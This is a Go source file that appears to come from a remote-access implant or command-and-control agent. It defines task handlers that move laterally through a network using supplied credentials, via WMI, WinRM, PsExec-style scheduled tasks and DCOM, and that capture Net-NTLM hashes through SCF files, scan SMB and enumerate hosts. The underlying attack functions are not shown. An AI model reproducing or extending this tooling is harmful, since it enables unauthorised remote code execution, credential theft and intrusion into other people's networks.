//go:build linux || windows
// +build linux windows

package main

import "strings"

func handleLateral(task Task, res *TaskResult) {
	out, err := lateralMove(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleLateralWMI(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 5)
	if len(parts) < 2 { res.Error = "format: <target>|<user>|<pass>|<cmd>"; return }
	t, u, p, c := parts[0], "", "", ""
	if len(parts) > 1 { u = parts[1] }
	if len(parts) > 2 { p = parts[2] }
	if len(parts) > 3 { c = parts[3] }
	out, err := lateralWMI(t, u, p, c)
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleLateralWinRM(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 5)
	if len(parts) < 2 { res.Error = "format: <target>|<user>|<pass>|<cmd>"; return }
	t, u, p, c := parts[0], "", "", ""
	if len(parts) > 1 { u = parts[1] }
	if len(parts) > 2 { p = parts[2] }
	if len(parts) > 3 { c = parts[3] }
	out, err := lateralWinRM(t, u, p, c)
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleLateralPsexec(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 5)
	if len(parts) < 2 { res.Error = "format: <target>|<user>|<pass>|<cmd>"; return }
	t, u, p, c := parts[0], "", "", ""
	if len(parts) > 1 { u = parts[1] }
	if len(parts) > 2 { p = parts[2] }
	if len(parts) > 3 { c = parts[3] }
	out, err := lateralPsexec(t, u, p, c)
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleLateralDCOM(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 5)
	if len(parts) < 2 { res.Error = "format: <target>|<user>|<pass>|<cmd>"; return }
	t, u, p, c := parts[0], "", "", ""
	if len(parts) > 1 { u = parts[1] }
	if len(parts) > 2 { p = parts[2] }
	if len(parts) > 3 { c = parts[3] }
	out, err := lateralDCOM(t, u, p, c)
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleLateralSCF(task Task, res *TaskResult) {
	out, err := lateralSCF(task.Command)
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleLateralList(task Task, res *TaskResult) {
	res.Output = `Available lateral movement methods:
  lateral_wmi    - WMI Exec (win32_process)
  lateral_winrm  - WinRM PowerShell Remoting
  lateral_psexec - PsExec-like via scheduled tasks
  lateral_dcom   - DCOM MMC20.Application
  lateral_scf    - SCF file Net-NTLM hash capture
  lateral        - legacy: type|target|user|pass|cmd`
}

func handleNetScanSMB(task Task, res *TaskResult) {
	out, err := netScanSMB(task.Command)
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleNetEnumHosts(task Task, res *TaskResult) {
	out, err := netEnumHosts(task.Command)
	if err != nil { res.Error = err.Error() } else { res.Output = out }
}

func handleNet(task Task, res *TaskResult) {
	out := executeNetCommand(task.Command)
	if strings.HasPrefix(out, "error:") {
		res.Error = out
	} else {
		res.Output = out
	}
}
